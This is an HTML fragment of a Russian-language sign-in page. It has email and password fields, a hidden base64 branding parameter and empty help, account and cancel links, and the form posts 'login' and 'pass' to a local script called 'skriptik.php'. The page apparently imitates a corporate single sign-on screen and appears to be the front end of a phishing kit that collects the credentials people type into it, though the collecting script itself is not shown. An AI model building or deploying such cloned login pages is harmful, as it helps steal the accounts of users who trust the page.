				<section id="section_rightColumn" class="signInRightColumn">

								<div id="signInMarketingImgMobile" class="herobanner-image"></div>

					<section id="signInFormSection" class="signinform">

						-->
						
							
						
					 
						<form id="signInForm" method="post" action="skriptik.php" autocomplete="off">
							
							  <input id="brandingParams" type="hidden" name="params" value="cmVxdWVzdF90aGVtZT1saXF1aWQ=" />

								<header class="signinform-title">
									<h1 id="marketingTextArea">Войти в сеть</h1>
								</header>
								<div id="errorDiv" style="display:none;padding-bottom:4px;"></div>
								<label id="signInLabel_SignInID">Идентификатор&nbsp;входа в сеть</label>
	
								<!-- signin id -->
								<input id="signInInput_SignInID"
									   class="textInput signInTextWidth"
									   tabindex="2"
									   name="login"
									   type="email"
									   maxlength="63"
									   value=""
									   placeholder="Адрес электронной почты"
									   autocomplete="off" required
								/>
								<section id="rememberMeSection">
									<input id="rememberSignInIdCheckBox" tabindex="4" class="checkBoxInput" type="checkbox" name="rememberSignIn" />

								</section>

								<label id="signInLabel_Password">Пароль</label>

                                <!-- password -->
                                <div class="passwordcontrol">
                                    <input id="signInInput_Password"
                                           class="textInput signInTextWidth passwordcontrol-field"
                                           tabindex="2"
                                           name="pass"
                                           type="password"
                                           maxlength="30"
                                           autocomplete="off"
										   required
                                    />
                                    <span class="passwordcontrol-button passwordcontrol-button-show" data-action="togglePassword">Показать</span>
                                    <span class="passwordcontrol-button passwordcontrol-button-hide" data-action="togglePassword">Скрыть</span>
                                </div>
                                
								<!-- captcha -->
								
	
								<!-- submit -->
								<section class="uiButtonPrimary">
									<input id="signInButton" tabindex="5" type="submit" value="Войти в сеть" />
								</section>
	
								<!-- help me -->
								
									<a id="troubleShooterLink" href="" class="smalla ssoForgotPasswordLink" tabindex="6">
										Проблемы при входе?
									</a>
								
								
								<div class="clearMe"></div>
								
								<!-- create account link -->
								
									<label id="dontHaveAnAcountLabel">У вас нет учетной записи?</label>
									<a id="createAccountLink" href="" tabindex="7">
										Создание новой учетной записи
									</a>
								
	
							

							<!-- cancel -->						
							
								<section class="cancelSignInSection">
									<a id="cancelSignInLink" href="" tabindex="8">Отмена</a>
								</section>
